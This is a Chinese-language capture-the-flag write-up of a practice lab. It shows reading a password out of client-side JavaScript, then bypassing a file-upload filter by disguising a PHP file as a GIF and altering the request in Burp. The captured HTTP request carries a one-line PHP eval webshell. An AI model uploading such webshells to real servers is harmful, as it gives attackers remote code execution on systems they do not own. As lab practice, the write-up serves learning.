一. 访问网站，js弹窗，burp拦截不到

![1637915914_61a09d0a04bfb228cbbcd.png!small](https://image.3001.net/images/20211126/1637915914_61a09d0a04bfb228cbbcd.png!small)

二. F12，顺利拿到密码，顺利进入下一步

![1637915927_61a09d176b2ecf5848104.png!small](https://image.3001.net/images/20211126/1637915927_61a09d176b2ecf5848104.png!small)

在源码中，没有发现有价值的线索，在js代码中，发现了if语句，并从中找到通关口令。

![1637915940_61a09d24ca33520340545.png!small](https://image.3001.net/images/20211126/1637915940_61a09d24ca33520340545.png!small)

最后进入到文件上传获取key的环节

三. 首先，将php改为gif格式，上传时使用burp进行拦截，改包重放，获取key。

  1. 将准备好的一句话木马文件后缀改为gif

![1637915951_61a09d2ff19885b18e831.png!small](https://image.3001.net/images/20211126/1637915951_61a09d2ff19885b18e831.png!small)

  2. 上传时，使用burp进行拦截并改包重放。

![1637915962_61a09d3a7eec6ddd42e95.png!small](https://image.3001.net/images/20211126/1637915962_61a09d3a7eec6ddd42e95.png!small)

![1637915971_61a09d4378802a78ee4c4.png!small](https://image.3001.net/images/20211126/1637915971_61a09d4378802a78ee4c4.png!small)

提示上传成功，但需要上传gif的文件才可以真正获取key，终究是我想短了。

    
    
    POST /carcar/upload.php HTTP/1.1  
    Host: 124.*.*.143  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Accept-Encoding: gzip, deflate  
    Content-Type: multipart/form-data; boundary= ---------------------------16060840859381824703629289096  
    Content-Length: 367  
    Origin: http://124.*.*.143  
    Connection: close  
    Referer: http://124.*.*.143/carcar/  
    Upgrade-Insecure-Requests: 1  
    ​  
    -----------------------------16060840859381824703629289096  
    Content-Disposition: form-data; name="file1"; filename="passwd.php"  
    Content-Type: image/gif  
    ​  
    <?php @eval($_POST['shy']);?>  
    -----------------------------16060840859381824703629289096  
    Content-Disposition: form-data; name="submit"  
    ​  
    ä¸•ä¼   
    -----------------------------16060840859381824703629289096--  
    ​  
    仔细分析这个文件包，发现有boundry的限制，那么接下来就要考虑如何突破这个限制。  
    ​  
    get到了一点其他的知识：  
    boundary 用于分割不同的字段，为了避免与正文内容重复，boundary 很长很复杂。然后 Content-Type 里指明了数据是以 multipart/form-data 来编码，本次请求的 boundary 是什么内容。消息主体里按照字段个数又分为多个结构类似的部分，每部分都是以 --boundary 开始，紧接着是内容描述信息，然后是回车，最后是字段具体内容（文本或二进制）。如果传输的是文件，还要包含文件名和文件类型信息。消息主体最后以 --boundary-- 标示结束。

  3. 经历了一段坎坷之后，最后，在木马语句前加入了文件头，顺利获取到key

![1637915986_61a09d5292dbf682161d3.png!small](https://image.3001.net/images/20211126/1637915986_61a09d5292dbf682161d3.png!small)菜鸟学知识，思路有点偏。

感谢Hacking Club 提供练习。

思路如有不对，还请各位师傅及时斧正，不胜感激！

